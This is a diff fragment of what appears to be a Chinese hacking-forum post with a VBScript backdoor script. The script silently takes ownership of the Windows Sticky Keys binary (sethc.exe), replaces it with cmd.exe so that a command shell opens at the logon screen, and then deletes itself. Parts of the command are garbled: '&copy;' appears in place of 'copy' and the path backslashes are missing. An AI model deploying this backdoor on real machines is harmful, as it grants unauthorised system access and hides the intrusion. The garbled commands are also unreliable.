@@ -11,7 +11,7 @@ ViewNums: 5289
 
 作者：孤狐浪子
 来源：红狼
-
+```
 on error resume next
 const HKEY_LOCAL_MACHINE = &H80000002
 strComputer = "."
@@ -45,7 +45,7 @@ Dim obj, success
 Set obj = CreateObject("WScript.Shell")
 success = obj.run("cmd /c takeown /f %SystemRoot%system32sethc.exe&echo y| cacls %SystemRoot%system32sethc.exe /G %USERNAME%:F&copy; %SystemRoot%system32cmd.exe %SystemRoot%system32acmd.exe&copy; %SystemRoot%system32sethc.exe %SystemRoot%system32asethc.exe&del %SystemRoot%system32sethc.exe&ren %SystemRoot%system32acmd.exe sethc.exe", 0, True)
 CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)
-
+```
 BY:孤狐浪子 QQ:393214425
 BLOG:itpro.blog.163.com
 
